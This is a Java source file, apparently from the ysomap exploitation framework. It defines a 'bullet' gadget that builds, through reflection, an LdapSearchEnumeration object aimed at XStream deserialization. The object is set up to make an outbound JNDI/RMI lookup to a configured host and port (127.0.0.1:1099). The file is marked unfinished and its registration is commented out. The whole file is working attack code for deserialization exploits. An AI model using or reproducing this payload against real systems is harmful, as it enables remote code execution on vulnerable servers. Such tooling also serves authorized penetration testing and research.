package ysomap.bullets.jdk;

import com.sun.jndi.ldap.LdapCtx;
import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import javax.naming.directory.BasicAttributes;
import javax.naming.directory.SearchControls;
import java.util.Vector;

/**
 * TODO 还没写完
 * @author wh1t3p1g
 * @since 2022/3/7
 */
//@Bullets
@Dependencies({"jdk"})
@Details("向外部发起RMI连接")
@Targets({Targets.XSTREAM})
@Authors({Authors.WH1T3P1G})
public class LazySearchEnumerationBullet extends AbstractBullet<Object> {


    @Override
    public Object getObject() throws Exception {
        Object ldapSearchEnumeration = ReflectionHelper.createWithoutConstructor("com.sun.jndi.ldap.LdapSearchEnumeration");
        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "hasMoreCalled", true);
        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "limit", 1);
        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "more", true);
        Vector<Object> entries = new Vector<>();
        Object entry = ReflectionHelper.createWithoutConstructor("com.sun.jndi.ldap.LdapEntry");
        ReflectionHelper.setFieldValue(entry, "DN", "uid=ysomap,ou=oa,dc=example,dc=com");
        BasicAttributes attributes = new BasicAttributes();
        BasicAttributes attributes1 = new BasicAttributes();

        attributes.put("javaClassName", attributes1);


        ReflectionHelper.setFieldValue(entry, "attributes", attributes);
        entries.add(entry);
        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "entries", entries);
        LdapCtx ctx = ReflectionHelper.createWithoutConstructor(LdapCtx.class);
        ReflectionHelper.setFieldValue(ctx, "hostname", "127.0.0.1");
        ReflectionHelper.setFieldValue(ctx, "port_number", 1099);
        Object search = ReflectionHelper.createWithoutConstructor("com.sun.jndi.ldap.LdapCtx$SearchArgs");
        SearchControls controls = new SearchControls();
        controls.setReturningObjFlag(true);
        ReflectionHelper.setFieldValue(search, "cons", controls);
        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "searchArgs", search);

        ReflectionHelper.setFieldValue(ldapSearchEnumeration, "homeCtx", ctx);

        return ldapSearchEnumeration;
    }
}
